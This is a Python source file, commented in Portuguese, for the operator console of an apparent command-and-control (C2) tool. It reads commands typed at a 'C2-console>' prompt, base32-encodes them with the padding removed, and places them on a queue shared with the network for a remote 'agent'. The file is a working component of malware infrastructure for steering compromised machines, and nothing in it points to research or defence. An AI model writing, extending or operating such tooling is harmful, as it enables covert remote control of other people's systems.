import base64
import sys
from time import sleep

class Painel:
    def __init__(self, filaComandos):
        self.fila = filaComandos

    def start(self):
        print("\n=== CONSOLE C2 INICIADO ===")
        print("Digite os comandos que deseja enviar para o agente.\n")

        while True:
            try:
                comandoPuro = input('C2-console> ')

                if not comandoPuro.strip():
                    continue

                if comandoPuro.lower() == 'exit':
                    print('[*] Encerrando o painel...')
                    sys.exit(0)

                comandoBytes = comandoPuro.encode('utf-8')
                comandoB32 = base64.b32encode(comandoBytes).replace(b'=', b'').decode('utf-8')

                self.fila.put(comandoB32)

            except (KeyboardInterrupt, SystemExit):
                break

            except Exception as e:
                print(f"[-] Erro no painel: {e}")
                
        # BLOCO START: Mantém o console interativo lendo comandos do teclado. Limpa espaços vazios, converte a ordem para Base32 string e injeta na esteira (filaComandos) compartilhada com a rede.
